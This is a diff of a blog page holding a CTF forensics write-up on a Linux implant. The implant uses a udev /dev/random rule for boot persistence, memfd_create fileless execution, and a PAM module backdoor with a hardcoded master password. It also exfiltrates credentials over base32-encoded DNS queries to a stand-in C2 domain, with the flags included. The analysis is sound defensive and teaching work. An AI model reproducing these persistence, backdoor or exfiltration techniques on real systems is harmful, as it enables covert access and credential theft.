@@ -4,9 +4,9 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-    <title>WRAITHSTEP (OSC Regional 2026) — Linux Implant Forensics</title>
-    <meta name="description" content="Writeup for WRAITHSTEP (OSC Regional 2026) — Linux forensics challenge: udev /dev/random persistence, PAM RC4 backdoor replacing pam_pkcs11.so, and DNS credential exfiltration via base32-encoded queries">
-    <meta property="og:title" content="WRAITHSTEP (OSC Regional 2026) — Linux Implant Forensics" />
+    <title>WRAITHSTEP (ROCSC Finals 2026) — Linux Implant Forensics</title>
+    <meta name="description" content="Writeup for WRAITHSTEP (ROCSC Finals 2026) — Linux forensics challenge: udev /dev/random persistence, PAM RC4 backdoor replacing pam_pkcs11.so, and DNS credential exfiltration via base32-encoded queries">
+    <meta property="og:title" content="WRAITHSTEP (ROCSC Finals 2026) — Linux Implant Forensics" />
     <meta property="og:locale" content="en_US" />
     <meta property="og:type" content="article" />
     <meta name="twitter:card" content="summary" />
@@ -150,13 +150,13 @@
         <p class="back-link">← <a href="index.html">Back to blog</a></p>
 
         <header class="post-header">
-          <h1>WRAITHSTEP (OSC Regional 2026) — Linux Implant Forensics</h1>
+          <h1>WRAITHSTEP (ROCSC Finals 2026) — Linux Implant Forensics</h1>
           <p class="post-subtitle">
-            Three-stage forensics challenge built around techniques documented in real incidents: udev /dev/random persistence (sedexp, 2024), fileless execution via memfd_create (PUMAKIT, 2024), a PAM module replacing pam_pkcs11.so with an RC4-obfuscated backdoor, and DNS-tunneled credential exfiltration.
+            Three-stage Linux forensics challenge: a fileless dropper launched at boot via a udev rule, a PAM module that replaced the real <code>pam_pkcs11.so</code> to intercept SSH logins, and a DNS exfiltration path that leaks credentials as base32-encoded query labels. Both binaries are stripped, same RC4 key.
           </p>
           <p class="post-meta">
             <span>Forensics • Malware Analysis</span>
-            <span>OSC Regional 2026</span>
+            <span>ROCSC Finals 2026</span>
             <span>Challenge by Alexandru Hossu</span>
           </p>
           <div class="post-tags">
@@ -172,20 +172,11 @@
         <nav class="post-toc">
           <p class="post-toc-title">On this page</p>
           <ul>
-            <li><a href="#background">Background</a></li>
             <li><a href="#stage1">Stage 1 — persistence vector + C2 domain (FLAG 1)</a></li>
             <li><a href="#stage2">Stage 2 — PAM backdoor RE + master password (FLAG 2)</a></li>
             <li><a href="#stage3">Stage 3 — DNS PCAP decode + stolen credentials (FLAG 3)</a></li>
-            <li><a href="#implant-map">Full implant execution map</a></li>
           </ul>
         </nav>
-
-        <section id="background">
-          <h2>Background</h2>
-          <p>The premise: security ops got an alert on a production Ubuntu 22.04 server. An engineer did a quick triage, pulled a forensic snapshot, and took the box offline. The archive contains a <code>/proc</code> snapshot, relevant filesystem files, system logs, and a DNS packet capture from the network tap.</p>
-          <p>Every technique in the implant maps to a documented real-world incident — the idea was to build something that felt like an actual post-incident analysis rather than a contrived CTF. The implant has two components: a dropper that survives reboot via a udev rule, and a malicious PAM module dropped in place of the real <code>pam_pkcs11.so</code> that intercepts SSH logins and exfiltrates credentials over DNS.</p>
-          <p>Both binaries are stripped, and both use the same 8-byte RC4 key — a deliberate choice to let you cross-confirm findings between the two stages.</p>
-        </section>
 
         <section id="stage1">
           <h2>Stage 1 — persistence vector + C2 domain (FLAG 1)</h2>
@@ -199,7 +190,7 @@ status:
   Name:   kworker/u4:2
   PPid:   512</code></pre>
           <ul>
-            <li><strong><code>/memfd:dropper (deleted)</code></strong> — the process is running from an anonymous in-memory file descriptor. This is the <code>memfd_create</code> fileless execution technique — nothing touches disk, so there is no binary to recover from the filesystem. The same pattern appears in PUMAKIT (Elastic Security Labs, December 2024) and perfctl.</li>
+            <li><strong><code>/memfd:dropper (deleted)</code></strong> — the process is running from an anonymous in-memory file descriptor, not from anything on disk. <code>memfd_create</code> opens a nameless file in memory, the parent writes the ELF payload into it, then <code>execve("/proc/self/fd/3")</code> runs it. Nothing to recover from the filesystem.</li>
             <li><strong>cmdline = null bytes</strong> — argv was overwritten with <code>memset()</code>. The process is completely invisible to <code>ps</code> and <code>cat /proc/PID/cmdline</code>. The <code>Name</code> field was set to <code>kworker/u4:2</code> to blend in with real kernel threads.</li>
             <li><strong>PPid = 512</strong> — this is the key. Real kernel threads (<code>kworker/u4:2</code> included) always have PPid = 2 (kthreadd). A <code>kworker</code> process with PPid = 512 (udevd) was spawned by a udev rule.</li>
           </ul>
@@ -211,8 +202,6 @@ status:
 ACTION=="add", ENV{MAJOR}=="1", ENV{MINOR}=="8", RUN+="/lib/udev/apm-events-d run"</code></pre>
           <p><code>MAJOR=1, MINOR=8</code> is <code>/dev/random</code>. The rule fires every time the kernel initializes the random number generator at boot — meaning the dropper runs on every reboot with no cron, no systemd unit, nothing that's easy to spot in the usual persistence checklist. The <code>syslog</code> entry confirms it:</p>
           <pre><code>Mar 15 02:09:05 prod-server01 systemd-udevd[512]: random: Process '/lib/udev/apm-events-d run' [1243] spawned for rule '/etc/udev/rules.d/99-apm-events.rules' line 3.</code></pre>
-          <p>This technique was documented by Stroz Friedberg in August 2024 as sedexp, with zero AV detections at the time of discovery.</p>
-
           <h3>Reversing apm-events-d</h3>
           <p>The binary at <code>lib/udev/apm-events-d</code> is a stripped x86-64 ELF. Load it in Ghidra or IDA.</p>
           <p><strong>Finding RC4:</strong> look for a function with two loops of 256 iterations and an S-box — the classic KSA+PRGA structure. The 8-byte key is hardcoded in <code>.rodata</code>:</p>
@@ -291,7 +280,7 @@ print(hashlib.sha256(b"Wr41thK3y_2024").hexdigest())
 # -> e594987b789745aec646eb15b004df670c09f9f7bff75ae4841fa08198f0f81d</code></pre>
           <p><strong>FLAG 2 = <code>CTF{e594987b789745aec646eb15b004df670c09f9f7bff75ae4841fa08198f0f81d}</code></strong></p>
           <div class="note">
-            The master password gives the attacker silent root-level SSH access on demand — any login attempt with <code>Wr41thK3y_2024</code> succeeds regardless of the actual user's password, and PAM returns success before <code>pam_unix.so</code> ever gets involved. This design is documented in detail by Nextron Systems as the Plague PAM backdoor pattern (2025).
+            Any SSH login attempt with <code>Wr41thK3y_2024</code> succeeds regardless of the actual user's password — PAM returns success before <code>pam_unix.so</code> ever gets involved. The normal user can still log in too, the stack just continues to <code>common-auth</code> after <code>PAM_IGNORE</code>.
           </div>
         </section>
 
@@ -335,41 +324,8 @@ print(hashlib.sha256(b"devops:D3v0ps_Pr0d_2024!").hexdigest())
 # -> 143ab34167e193d666e56dcfc971373bbb2f80a3b0e54ed7bf12ff6e1e5af094</code></pre>
           <p><strong>FLAG 3 = <code>CTF{143ab34167e193d666e56dcfc971373bbb2f80a3b0e54ed7bf12ff6e1e5af094}</code></strong></p>
           <div class="note">
-            DNS exfiltration survives in almost every network environment because DNS is rarely filtered outbound. The <code>.invalid</code> TLD means no upstream resolver will ever forward the query — in a real deployment the attacker runs an authoritative NS for their C2 domain and collects the labels on the server side. The technique was documented by x-c3ll and later observed in Symbiote (BlackBerry/Intezer, 2022).
+            The <code>.invalid</code> TLD means no upstream resolver will ever forward the query — each label is just collected server-side by whoever runs the authoritative NS for the C2 domain.
           </div>
-        </section>
-
-        <section id="implant-map">
-          <h2>Full implant execution map</h2>
-          <pre><code>Boot
- └─ udev /dev/random add event
-     └─ /lib/udev/apm-events-d run  (pid 1243, exits)
-         └─ fork child (pid 1247)
-             ├─ masquerade: Name="kworker/u4:2", argv zeroed
-             ├─ memfd_create("dropper") -> fd 3
-             ├─ write(fd, payload_elf)
-             └─ execve("/proc/self/fd/3")  [fileless]
-                 └─ exe -> /memfd:dropper (deleted)  [ARTIFACT]
-
-SSH login: devops@prod-server01
- └─ sshd -> PAM stack
-     └─ pam_pkcs11.so: pam_sm_authenticate()
-         ├─ check_master("D3v0ps_Pr0d_2024!") -> FALSE
-         ├─ fork child
-         │   └─ dns_exfil("devops", "D3v0ps_Pr0d_2024!")
-         │       ├─ base32("devops:D3v0ps_Pr0d_2024!") = "mrsxm33q...gazdiii"
-         │       ├─ DNS: mrsxm33qom5eim3wgbyhgx2qoiygixzs.0.d.telemetry-svc.invalid
-         │       ├─ DNS: gazdiii.1.d.telemetry-svc.invalid
-         │       └─ DNS: done.2.d.telemetry-svc.invalid
-         └─ return PAM_IGNORE  (auth continues normally)</code></pre>
-          <p>References used when designing the challenge:</p>
-          <ul>
-            <li>sedexp (LevelBlue/Stroz Friedberg, Aug 2024) — udev /dev/random persistence with zero AV detections</li>
-            <li>PUMAKIT (Elastic Security Labs, Dec 2024) — memfd_create fileless execution in a Linux rootkit</li>
-            <li>Plague PAM backdoor (Nextron Systems, Aug 2025) — PAM module intercepting authentication silently</li>
-            <li>PAM DNS exfiltration by x-c3ll — base32 credential encoding over DNS queries</li>
-            <li>Symbiote (BlackBerry/Intezer, Jun 2022) — DNS exfiltration in a production Linux implant</li>
-          </ul>
         </section>
       </article>
 
